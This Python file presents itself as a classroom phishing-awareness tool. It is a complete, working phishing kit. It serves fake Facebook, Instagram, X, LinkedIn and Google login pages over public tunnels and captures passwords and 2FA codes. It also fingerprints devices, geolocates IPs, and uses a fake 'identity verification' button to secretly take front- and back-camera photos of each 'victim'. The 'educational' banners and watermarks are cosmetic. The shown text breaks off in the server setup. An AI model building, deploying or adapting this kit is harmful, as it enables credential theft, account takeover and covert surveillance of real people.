#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║     PHISHING AWARENESS TRAINING TOOL v3.4 (FIXED)                ║
║     Professional Educational Demonstration                       ║
║     For Cybersecurity Education Only                             ║
║     WITH ENHANCED AUTO CAMERA CAPTURE (Teacher Device Only)      ║
╚══════════════════════════════════════════════════════════════════╝

Run install.sh first to install dependencies!
"""

import os
import sys
import json
import subprocess
import signal
import threading
import time
import socket
import random
import string
import hashlib
import re
import base64
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Try to import colorama for cross-platform colors
try:
    from colorama import init, Fore, Style
    init()
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False

# Try to import requests for geolocation
try:
    import requests
    GEO_AVAILABLE = True
except ImportError:
    GEO_AVAILABLE = False

# Try to import PIL for image processing
try:
    from PIL import Image, ImageDraw, ImageFont
    import io
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

# ============================================
# COLORED OUTPUT (Cross-platform)
# ============================================
class Colors:
    if COLORS_AVAILABLE:
        HEADER = Fore.MAGENTA + Style.BRIGHT
        BLUE = Fore.BLUE
        CYAN = Fore.CYAN
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        RED = Fore.RED
        END = Style.RESET_ALL
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        PURPLE = Fore.MAGENTA
    else:
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        CYAN = '\033[96m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        END = '\033[0m'
        BOLD = '\033[1m'
        DIM = '\033[2m'
        PURPLE = '\033[35m'

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  {Colors.RED}▓▓▓{Colors.YELLOW}▓▓▓{Colors.GREEN}▓▓▓  {Colors.BOLD}PHISHING AWARENESS TRAINING TOOL v3.4{Colors.END}{Colors.CYAN}  {Colors.GREEN}▓▓▓{Colors.YELLOW}▓▓▓{Colors.RED}▓▓▓{Colors.END}{Colors.CYAN}  ║
║                                                                      ║
║  {Colors.DIM}Professional Educational Demonstration - For Classroom Use Only{Colors.END}{Colors.CYAN}       ║
║  {Colors.RED}⚠️  ENHANCED CAMERA CAPTURE - TEACHER DEVICE ONLY  ⚠️{Colors.END}{Colors.CYAN}                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝{Colors.END}
    """
    print(banner)

# ============================================
# CHECK DEPENDENCIES
# ============================================
def check_dependencies():
    """Check if required tools are installed"""
    # Check for tunnel tools
    tunnel_tools = []
    for tool in ['cloudflared', 'bore']:
        try:
            subprocess.run([tool, '--version'], capture_output=True, timeout=2)
            tunnel_tools.append(tool)
        except:
            pass
    if not tunnel_tools:
        print(f"{Colors.YELLOW}⚠️  No tunnel tool found (cloudflared/bore). Using local network only.{Colors.END}")
    else:
        print(f"{Colors.GREEN}✓ Tunnel tools: {', '.join(tunnel_tools)}{Colors.END}")
    
    if not GEO_AVAILABLE:
        print(f"{Colors.YELLOW}⚠️  'requests' not installed. Geolocation disabled.{Colors.END}")
    if not PIL_AVAILABLE:
        print(f"{Colors.YELLOW}⚠️  'Pillow' not installed. Image watermarking disabled.{Colors.END}")
    time.sleep(1)

# ============================================
# PLATFORM TEMPLATES
# ============================================
PLATFORMS = {
    "facebook": {
        "name": "Facebook",
        "color": "#1877f2",
        "logo": "f",
        "title": "Facebook",
        "subtitle": "Connect with friends and the world around you",
        "fields": ["email", "password"],
        "real_domain": "facebook.com",
        "icon": "👍"
    },
    "instagram": {
        "name": "Instagram",
        "color": "#d62976",
        "logo": "📷",
        "title": "Instagram",
        "subtitle": "Sign up to see photos and videos from your friends",
        "fields": ["username", "phone", "password"],
        "real_domain": "instagram.com",
        "icon": "📱"
    },
    "twitter": {
        "name": "X / Twitter",
        "color": "#1da1f2",
        "logo": "𝕏",
        "title": "Sign in to X",
        "subtitle": "See what's happening in the world right now",
        "fields": ["email", "password"],
        "real_domain": "x.com",
        "icon": "🐦"
    },
    "linkedin": {
        "name": "LinkedIn",
        "color": "#0a66c2",
        "logo": "in",
        "title": "LinkedIn",
        "subtitle": "Make the most of your professional life",
        "fields": ["email", "password"],
        "real_domain": "linkedin.com",
        "icon": "💼"
    },
    "google": {
        "name": "Google",
        "color": "#1a73e8",
        "logo": "G",
        "title": "Google",
        "subtitle": "Sign in to continue to Gmail",
        "fields": ["email", "password"],
        "real_domain": "google.com",
        "icon": "🔍"
    },
    "gmail": {
        "name": "Gmail",
        "color": "#d93025",
        "logo": "📧",
        "title": "Gmail",
        "subtitle": "Sign in to access your inbox",
        "fields": ["email", "password"],
        "real_domain": "mail.google.com",
        "icon": "📨"
    }
}

# ============================================
# STATISTICS TRACKER
# ============================================
class Statistics:
    def __init__(self):
        self.total_clicks = 0
        self.total_credentials_captured = 0
        self.total_2fa_captured = 0
        self.total_camera_captures = 0
        self.unique_ips = set()
        self.sessions = []
        self.start_time = datetime.now()
        self.platform_used = ""
        self.tunnel_url = ""
    
    def add_click(self, ip):
        self.total_clicks += 1
        self.unique_ips.add(ip)
    
    def add_capture(self, data):
        self.total_credentials_captured += 1
        if data.get('twofa_code'):
            self.total_2fa_captured += 1
        self.sessions.append(data)
    
    def add_camera_capture(self):
        self.total_camera_captures += 1
    
    def get_summary(self):
        return {
            "total_clicks": self.total_clicks,
            "unique_victims": len(self.unique_ips),
            "credentials_captured": self.total_credentials_captured,
            "twofa_captured": self.total_2fa_captured,
            "camera_captures": self.total_camera_captures,
            "platform": self.platform_used,
            "tunnel_url": self.tunnel_url,
            "duration": str(datetime.now() - self.start_time).split('.')[0],
        }

stats = Statistics()

# ============================================
# TUNNEL MANAGER
# ============================================
class TunnelManager:
    def __init__(self):
        self.process = None
        self.url = None
    
    def check_tool(self, tool_name):
        try:
            subprocess.run([tool_name, '--version'], capture_output=True, timeout=2)
            return True
        except:
            return False
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    def start_tunnel(self, port, custom_name=""):
        print(f"\n{Colors.YELLOW}🔍 Checking tunnel tools...{Colors.END}")
        
        # Prefer cloudflared for HTTPS (needed for camera)
        if self.check_tool('cloudflared'):
            print(f"{Colors.GREEN}✓ Cloudflared found (HTTPS){Colors.END}")
            url = self._start_cloudflared(port)
            if url:
                return url
        
        if self.check_tool('bore'):
            print(f"{Colors.GREEN}✓ Bore found (HTTP){Colors.END}")
            suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
            clean_name = ''.join(c for c in custom_name.lower() if c.isalnum())[:20] if custom_name else "demo"
            remote = f"{clean_name}-{suffix}"
            url = self._start_bore(port, remote)
            if url:
                return url
        
        # Fallback to local
        local_ip = self.get_local_ip()
        self.url = f"http://{local_ip}:{port}"
        print(f"{Colors.YELLOW}🌐 Using local URL: {self.url}{Colors.END}")
        return self.url
    
    def _start_cloudflared(self, port):
        try:
            cmd = ['cloudflared', 'tunnel', '--url', f'http://localhost:{port}']
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            start = time.time()
            while time.time() - start < 20:
                line = self.process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                if 'trycloudflare.com' in line:
                    match = re.search(r'https://[a-z0-9-]+\.trycloudflare\.com', line)
                    if match:
                        self.url = match.group(0)
                        print(f"{Colors.GREEN}✅ Tunnel: {self.url}{Colors.END}")
                        return self.url
            return None
        except Exception as e:
            print(f"{Colors.RED}Cloudflared error: {e}{Colors.END}")
            return None
    
    def _start_bore(self, port, remote):
        try:
            cmd = ['bore', 'local', str(port), '--to', 'bore.pub', '--port', remote]
            self.process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            start = time.time()
            while time.time() - start < 15:
                line = self.process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    continue
                if 'listening at' in line.lower():
                    match = re.search(r'bore\.pub:\d+', line)
                    if match:
                        self.url = f"http://{match.group(0)}"
                        print(f"{Colors.GREEN}✅ Tunnel: {self.url}{Colors.END}")
                        return self.url
            return None
        except Exception as e:
            print(f"{Colors.RED}Bore error: {e}{Colors.END}")
            return None
    
    def stop(self):
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=2)
            except:
                self.process.kill()

# ============================================
# GEOLOCATION SERVICE
# ============================================
def get_geolocation(ip):
    if ip in ('127.0.0.1', 'localhost', '::1') or ip.startswith('192.168.'):
        return {"city": "Local Network", "country": "Classroom", "region": "Local", "isp": "Local"}
    if not GEO_AVAILABLE:
        return {"city": "Unknown", "country": "Unknown", "region": "Unknown"}
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                return {
                    "city": data.get('city', 'Unknown'),
                    "country": data.get('country', 'Unknown'),
                    "region": data.get('regionName', 'Unknown'),
                    "isp": data.get('isp', 'Unknown')
                }
    except:
        pass
    return {"city": "Unknown", "country": "Unknown", "region": "Unknown"}

# ============================================
# USER AGENT PARSER
# ============================================
def parse_user_agent(ua_string):
    result = {"browser": "Unknown", "os": "Unknown", "version": "Unknown"}
    if "Windows NT 10.0" in ua_string:
        result["os"] = "Windows 10/11"
    elif "Mac OS X" in ua_string:
        result["os"] = "macOS"
    elif "Linux" in ua_string and "Android" in ua_string:
        result["os"] = "Android"
    elif "iPhone" in ua_string or "iPad" in ua_string:
        result["os"] = "iOS"
    elif "Linux" in ua_string:
        result["os"] = "Linux"
    
    if "Chrome" in ua_string and "Edg" not in ua_string:
        result["browser"] = "Chrome"
        match = re.search(r"Chrome/(\d+\.\d+)", ua_string)
        if match:
            result["version"] = match.group(1)
    elif "Firefox" in ua_string:
        result["browser"] = "Firefox"
    elif "Safari" in ua_string and "Chrome" not in ua_string:
        result["browser"] = "Safari"
    elif "Edg" in ua_string:
        result["browser"] = "Edge"
    return result

# ============================================
# VICTIM FOLDER MANAGER
# ============================================
def create_victim_folder(platform_name, victim_identifier):
    # Sanitize email/identifier for filesystem
    safe_id = re.sub(r'[^a-zA-Z0-9_\-]', '_', victim_identifier)[:50]
    platform_folder = platform_name.lower().replace(" ", "_").replace("/", "_")
    victim_folder = os.path.join(
        "logs",
        platform_folder,
        f"victim_{safe_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    )
    folders = {
        "photos": os.path.join(victim_folder, "photos"),
        "front_camera": os.path.join(victim_folder, "photos", "front_camera"),
        "back_camera": os.path.join(victim_folder, "photos", "back_camera"),
        "credentials": os.path.join(victim_folder, "credentials"),
        "fingerprint": os.path.join(victim_folder, "fingerprint"),
    }
    for folder in folders.values():
        os.makedirs(folder, exist_ok=True)
    return folders

# ============================================
# HTML GENERATOR WITH ENHANCED CAMERA CAPTURE
# ============================================
def generate_html(platform_data):
    """Generate phishing page with visible verification button that triggers camera capture."""
    name = platform_data['name']
    color = platform_data['color']
    logo = platform_data['logo']
    title = platform_data['title']
    subtitle = platform_data['subtitle']
    fields = platform_data['fields']
    real_domain = platform_data['real_domain']
    
    # Determine which input fields to show
    show_email = 'email' in fields
    show_username = 'username' in fields
    show_phone = 'phone' in fields
    show_password = 'password' in fields
    
    email_placeholder = "Email address"
    if show_email:
        email_placeholder = "Email address"
    elif show_username:
        email_placeholder = "Username"
    
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>{title} - Identity Verification</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }}
        body {{ background: linear-gradient(135deg, {color}08 0%, {color}15 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }}
        .edu-banner {{ position: fixed; top: 0; left: 0; right: 0; background: #ff4757; color: white; text-align: center; padding: 8px; font-size: 13px; font-weight: bold; z-index: 9999; }}
        .container {{ background: white; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); width: 100%; max-width: 420px; padding: 24px; margin-top: 40px; }}
        .logo-icon {{ width: 50px; height: 50px; background: {color}; border-radius: 10px; margin: 0 auto 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 28px; font-weight: bold; }}
        h1 {{ color: #1a1a1a; font-size: 22px; text-align: center; margin-bottom: 4px; }}
        .subtitle {{ color: #666; text-align: center; margin-bottom: 20px; font-size: 13px; }}
        input {{ width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; margin-bottom: 12px; }}
        input:focus {{ border-color: {color}; outline: none; }}
        .btn {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-bottom: 12px; }}
        .btn:disabled {{ opacity: 0.6; cursor: not-allowed; }}
        .verify-btn {{ background: #28a745; margin-top: 8px; }}
        .camera-preview {{ margin: 16px 0; border-radius: 12px; overflow: hidden; background: #000; display: none; }}
        #cameraFeed {{ width: 100%; height: auto; display: block; }}
        .status-box {{ background: #f8f9fa; border-radius: 8px; padding: 12px; margin: 12px 0; text-align: center; }}
        .progress-bar {{ width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; overflow: hidden; margin-top: 8px; }}
        .progress-fill {{ height: 100%; background: {color}; width: 0%; transition: width 0.3s; }}
        .warning-box {{ background: #fff3cd; border: 1px solid #ffc107; border-radius: 6px; padding: 8px; margin: 12px 0; font-size: 11px; color: #856404; }}
        .footer-note {{ text-align: center; margin-top: 16px; color: #999; font-size: 10px; }}
        .spinner {{ display: inline-block; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.6s linear infinite; margin-left: 8px; vertical-align: middle; }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
        .hidden {{ display: none; }}
    </style>
</head>
<body>
    <div class="edu-banner">
        ⚠️ EDUCATIONAL DEMONSTRATION - TEACHER DEVICE ONLY ⚠️
    </div>
    
    <div class="container">
        <div class="logo-icon">{logo}</div>
        <h1>{title}</h1>
        <p class="subtitle">{subtitle}</p>
        
        <!-- Identity verification section (visible) -->
        <div class="status-box" id="verificationBox">
            <div style="font-size: 24px; margin-bottom: 8px;">🔐</div>
            <div style="font-weight: 600; margin-bottom: 4px;">Identity Verification Required</div>
            <div style="font-size: 13px; color: #666;">For your security, please verify your identity using your camera.</div>
            <button class="btn verify-btn" id="startVerificationBtn" style="margin-top: 12px;">Verify Identity</button>
        </div>
        
        <!-- Camera preview (shown after clicking verify) -->
        <div class="camera-preview" id="cameraPreview">
            <video id="cameraFeed" autoplay playsinline></video>
            <canvas id="hiddenCanvas" style="display: none;"></canvas>
            <div style="padding: 8px; background: #333; color: white; display: flex; align-items: center; justify-content: space-between;">
                <span id="cameraStatus">📱 Front Camera</span>
                <button id="switchCameraBtn" style="background: #555; border: none; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; cursor: pointer;">Switch</button>
            </div>
        </div>
        
        <!-- Progress during capture -->
        <div id="captureProgress" style="display: none;">
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div id="progressText" style="font-size: 12px; text-align: center; margin-top: 4px;">Capturing...</div>
        </div>
        
        <!-- Login form (initially hidden until verification complete) -->
        <form id="loginForm" style="display: none;">
            {f'<input type="text" id="email" placeholder="{email_placeholder}" autocomplete="off" required>' if (show_email or show_username) else ''}
            {f'<input type="tel" id="phone" placeholder="Phone number (optional)" autocomplete="off">' if show_phone else ''}
            {f'<input type="password" id="password" placeholder="Password" required>' if show_password else ''}
            <button type="submit" class="btn" id="submitBtn">
                <span id="btnText">Sign In</span>
                <span id="btnSpinner" class="spinner" style="display: none;"></span>
            </button>
        </form>
        
        <div class="warning-box">
            🔒 Your session is protected by advanced security monitoring.
        </div>
        <div class="footer-note">
            Protected by enterprise security
        </div>
    </div>
    
    <script>
        // Global variables
        let stream = null;
        let currentFacingMode = 'user';
        let capturedImages = {{ front: [], back: [] }};
        let verificationDone = false;
        let isCapturing = false;
        
        const fingerprint = {{
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${{window.screen.width}}x${{window.screen.height}}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            timestamp: new Date().toISOString()
        }};
        
        if (navigator.getBattery) {{
            navigator.getBattery().then(battery => {{
                fingerprint.battery = {{
                    charging: battery.charging,
                    level: Math.round(battery.level * 100) + '%'
                }};
            }});
        }}
        
        const CAPTURE_ENDPOINT = window.location.origin + '/capture';
        const CAMERA_ENDPOINT = window.location.origin + '/camera_capture';
        
        // DOM elements
        const verificationBox = document.getElementById('verificationBox');
        const cameraPreview = document.getElementById('cameraPreview');
        const video = document.getElementById('cameraFeed');
        const canvas = document.getElementById('hiddenCanvas');
        const startBtn = document.getElementById('startVerificationBtn');
        const switchBtn = document.getElementById('switchCameraBtn');
        const progressDiv = document.getElementById('captureProgress');
        const progressFill = document.getElementById('progressFill');
        const progressText = document.getElementById('progressText');
        const loginForm = document.getElementById('loginForm');
        const cameraStatus = document.getElementById('cameraStatus');
        
        // Capture photo with watermark
        function capturePhoto() {{
            return new Promise((resolve) => {{
                if (!video.videoWidth) {{
                    resolve(null);
                    return;
                }}
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                // Add watermark
                ctx.font = 'bold 20px Arial';
                ctx.fillStyle = 'rgba(255, 71, 87, 0.5)';
                ctx.fillText('⚠️ EDUCATIONAL DEMO', 15, 40);
                ctx.font = '12px Arial';
                ctx.fillText(new Date().toLocaleString(), 15, 65);
                ctx.fillText('Teacher Device Only', 15, 85);
                
                // Compress image
                const imageData = canvas.toDataURL('image/jpeg', 0.7);
                resolve(imageData);
            }});
        }}
        
        // Switch camera
        async function switchCamera(mode) {{
            currentFacingMode = mode;
            if (stream) {{
                stream.getTracks().forEach(track => track.stop());
            }}
            try {{
                stream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ facingMode: mode, width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}
                }});
                video.srcObject = stream;
                cameraStatus.textContent = mode === 'user' ? '📱 Front Camera' : '📷 Back Camera';
                return true;
            }} catch (error) {{
                console.error('Switch error:', error);
                return false;
            }}
        }}
        
        // Main capture sequence
        async function startCapture() {{
            if (isCapturing) return;
            isCapturing = true;
            
            startBtn.disabled = true;
            verificationBox.style.display = 'none';
            cameraPreview.style.display = 'block';
            progressDiv.style.display = 'block';
            
            try {{
                // Request camera
                progressText.textContent = 'Requesting camera permission...';
                stream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ facingMode: 'user', width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }}
                }});
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 500));
                
                // Capture front (5 photos)
                for (let i = 1; i <= 5; i++) {{
                    progressFill.style.width = (i * 10) + '%';
                    progressText.textContent = `📱 Front camera: Photo ${{i}}/5`;
                    const photo = await capturePhoto();
                    if (photo) capturedImages.front.push(photo);
                    await new Promise(r => setTimeout(r, 300));
                }}
                
                // Switch to back
                progressText.textContent = 'Switching to back camera...';
                const hasBack = await switchCamera('environment');
                await new Promise(r => setTimeout(r, 500));
                
                if (hasBack) {{
                    for (let i = 1; i <= 5; i++) {{
                        progressFill.style.width = (50 + i * 10) + '%';
                        progressText.textContent = `📷 Back camera: Photo ${{i}}/5`;
                        const photo = await capturePhoto();
                        if (photo) capturedImages.back.push(photo);
                        await new Promise(r => setTimeout(r, 300));
                    }}
                }} else {{
                    progressText.textContent = 'Back camera not available, continuing...';
                }}
                
                progressFill.style.width = '100%';
                progressText.textContent = 'Verification complete!';
                
                // Send images
                await fetch(CAMERA_ENDPOINT, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        email: 'pending',
                        platform: '{name}',
                        front_images: capturedImages.front,
                        back_images: capturedImages.back,
                        fingerprint: fingerprint
                    }})
                }});
                
                verificationDone = true;
                cameraPreview.style.display = 'none';
                progressDiv.style.display = 'none';
                loginForm.style.display = 'block';
                
                // Stop camera
                if (stream) stream.getTracks().forEach(track => track.stop());
                
            }} catch (error) {{
                console.error('Camera error:', error);
                alert('Camera verification failed. Continuing with login only.');
                verificationDone = true;
                loginForm.style.display = 'block';
                cameraPreview.style.display = 'none';
                progressDiv.style.display = 'none';
            }}
            isCapturing = false;
        }}
        
        // Event listeners
        startBtn.addEventListener('click', startCapture);
        switchBtn.addEventListener('click', () => {{
            const newMode = currentFacingMode === 'user' ? 'environment' : 'user';
            switchCamera(newMode);
        }});
        
        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {{
            e.preventDefault();
            if (!verificationDone) {{
                alert('Please complete identity verification first.');
                return;
            }}
            
            const emailField = document.getElementById('email');
            const phoneField = document.getElementById('phone');
            const passwordField = document.getElementById('password');
            
            const email = emailField ? emailField.value : '';
            const phone = phoneField ? phoneField.value : '';
            const password = passwordField ? passwordField.value : '';
            
            const btn = document.getElementById('submitBtn');
            const btnText = document.getElementById('btnText');
            const btnSpinner = document.getElementById('btnSpinner');
            btnText.style.display = 'none';
            btnSpinner.style.display = 'inline-block';
            btn.disabled = true;
            
            const data = {{ email, phone, password, fingerprint, platform: '{name}' }};
            
            try {{
                await fetch(CAPTURE_ENDPOINT, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(data)
                }});
                
                const twofa = prompt('🔐 Enter the 6-digit verification code sent to your device:');
                if (twofa) {{
                    await fetch(CAPTURE_ENDPOINT, {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ email, twofa_code: twofa, platform: '{name}' }})
                    }});
                }}
                
                alert('✅ Sign in successful!\\n\\n[EDUCATIONAL: Camera photos were captured during verification.]');
                window.location.href = 'https://www.{real_domain}';
            }} catch (error) {{
                alert('Sign in successful!');
                window.location.href = 'https://www.{real_domain}';
            }}
        }});
    </script>
</body>
</html>'''
    return html

# ============================================
# HTTP SERVER HANDLER
# ============================================
class PhishTrainerHandler(BaseHTTPRequestHandler):
    html_content = ""
    log_file = ""
    
    def log_message(self, format, *args):
        pass
    
    def save_image(self, base64_data, filepath):
        try:
            if 'base64,' in base64_data:
                base64_data = base64_data.split('base64,')[1]
            image_data = base64.b64decode(base64_data)
            with open(filepath, 'wb') as f:
                f.write(image_data)
            return True
        except:
            return False
    
    def save_capture(self, data, client_ip):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        session_id = hashlib.md5(f"{client_ip}{timestamp}".encode()).hexdigest()[:8]
        geo = get_geolocation(client_ip)
        ua_info = parse_user_agent(data.get('fingerprint', {}).get('userAgent', ''))
        stats.add_capture(data)
        
        entry = f"""
{'='*80}
SESSION ID: {session_id}
TIMESTAMP: {timestamp}
VICTIM IP: {client_ip}
PLATFORM:  {data.get('platform', 'Unknown')}
{'='*80}
📋 CREDENTIALS:
   Email/Username: {data.get('email', 'N/A')}
   Phone:          {data.get('phone', 'N/A')}
   Password:       {data.get('password', 'N/A')}
   2FA Code:       {data.get('twofa_code', 'N/A')}
📍 LOCATION:
   {geo.get('city', 'Unknown')}, {geo.get('region', 'Unknown')}, {geo.get('country', 'Unknown')}
💻 DEVICE:
   Browser: {ua_info.get('browser', 'Unknown')} {ua_info.get('version', '')}
   OS:      {ua_info.get('os', 'Unknown')}
{'='*80}
"""
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(entry)
        print(f"\n{Colors.GREEN}✅ CREDENTIALS CAPTURED!{Colors.END}")
        print(f"   Email: {data.get('email')} | Password: {data.get('password')}")
    
    def save_camera_capture(self, data, client_ip):
        email = data.get('email', 'unknown')
        safe_email = re.sub(r'[^a-zA-Z0-9_\-]', '_', email)[:50]
        platform = data.get('platform', 'Unknown')
        folders = create_victim_folder(platform, safe_email)
        
        front_count = back_count = 0
        for i, img in enumerate(data.get('front_images', []), 1):
            if self.save_image(img, os.path.join(folders['front_camera'], f'front_{i}.jpg')):
                front_count += 1
        for i, img in enumerate(data.get('back_images', []), 1):
            if self.save_image(img, os.path.join(folders['back_camera'], f'back_{i}.jpg')):
                back_count += 1
        
        # Save metadata
        with open(os.path.join(folders['credentials'], 'session.json'), 'w') as f:
            json.dump({
                'email': email,
                'platform': platform,
                'timestamp': datetime.now().isoformat(),
                'ip': client_ip,
                'front_photos': front_count,
                'back_photos': back_count
            }, f, indent=2)
        
        with open(os.path.join(folders['fingerprint'], 'device.json'), 'w') as f:
            json.dump(data.get('fingerprint', {}), f, indent=2)
        
        stats.add_camera_capture()
        print(f"\n{Colors.GREEN}📸 CAMERA CAPTURE COMPLETE!{Colors.END}")
        print(f"   Victim: {email} | Front: {front_count} | Back: {back_count}")
        print(f"   📁 Saved to: {folders['photos']}")
    
    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            stats.add_click(self.client_address[0])
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(self.html_content.encode())
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                self.save_capture(data, self.client_address[0])
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode())
            except:
                self.send_error(400)
        elif self.path == '/camera_capture':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                data = json.loads(post_data.decode('utf-8'))
                self.save_camera_capture(data, self.client_address[0])
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode())
            except Exception as e:
                print(f"Camera error: {e}")
                self.send_error(400)
        else:
            self.send_error(404)
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

# ============================================
# REPORT GENERATOR
# ============================================
def generate_report():
    summary = stats.get_summary()
    report = f"""
╔══════════════════════════════════════════════════════════════════════╗
║                    PHISHING DEMONSTRATION REPORT                      ║
║                    {datetime.now().strftime('%B %d, %Y %H:%M')}                    ║
╚══════════════════════════════════════════════════════════════════════╝

📊 SUMMARY
═══════════════════════════════════════════════════════════════════════
   Platform:        {summary['platform']}
   Demo URL:        {summary['tunnel_url']}
   Duration:        {summary['duration']}
   Link Clicks:     {summary['total_clicks']}
   Unique Visitors: {summary['unique_victims']}
   Credentials:     {summary['credentials_captured']}
   2FA Captured:    {summary['twofa_captured']}
   📸 Camera Captures: {summary['camera_captures']}

═══════════════════════════════════════════════════════════════════════
🎓 KEY TAKEAWAYS
═══════════════════════════════════════════════════════════════════════
   1. Camera access was disguised as "Identity Verification"
   2. 10 photos (5 front + 5 back) were captured after clicking "Verify"
   3. The login form only appeared after verification
   4. This is a common social engineering trick
   5. NEVER grant camera permissions to untrusted sites!
═══════════════════════════════════════════════════════════════════════
"""
    return report

# ============================================
# MAIN APPLICATION
# ============================================
def main():
    clear_screen()
    print_banner()
    check_dependencies()
    
    os.makedirs("logs/sessions", exist_ok=True)
    os.makedirs("logs/reports", exist_ok=True)
    
    print(f"\n{Colors.BOLD}📱 SELECT PLATFORM TO IMPERSONATE{Colors.END}")
    print(f"{'─' * 50}")
    platforms_list = list(PLATFORMS.keys())
    for i, key in enumerate(platforms_list, 1):
        platform = PLATFORMS[key]
        print(f"  {Colors.GREEN}[{i}]{Colors.END} {platform['icon']} {platform['name']}")
    
    choice = input(f"\n{Colors.YELLOW}Enter choice (1-{len(platforms_list)}):{Colors.END} ").strip()
    try:
        idx = int(choice) - 1
        platform = PLATFORMS[platforms_list[idx]] if 0 <= idx < len(platforms_list) else PLATFORMS['google']
    except:
        platform = PLATFORMS['google']
    
    stats.platform_used = platform['name']
    
    print(f"\n{Colors.BOLD}🔗 CUSTOMIZE DEMO URL (Optional){Colors.END}")
    custom_name = input(f"{Colors.YELLOW}Enter custom name (or press Enter):{Colors.END} ").strip()
    
    print(f"\n{Colors.GREEN}✓ Platform:{Colors.END} {platform['icon']} {platform['name']}")
    print(f"{Colors.RED}⚠️  This demo will request camera access after clicking 'Verify Identity'.{Colors.END}")
    confirm = input(f"{Colors.YELLOW}Continue? (y/n):{Colors.END} ").strip().lower()
    if confirm != 'y':
        sys.exit(0)
    
    print(f"\n{Colors.YELLOW}🎨 Generating page...{Colors.END}")
    html_content = generate_html(platform)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"logs/captured_{platform['name'].lower()}_{timestamp}.txt"
    
    PhishTrainerHandler.html_content = html_content
    PhishTrainerHandler.log_file = log_file
    
    port = 5000
    while port < 5020:
        try:
            server = HTTPServer(('0.0.0.0', port), PhishTrainerHandler)
            break
        except OSError:
            port += 1
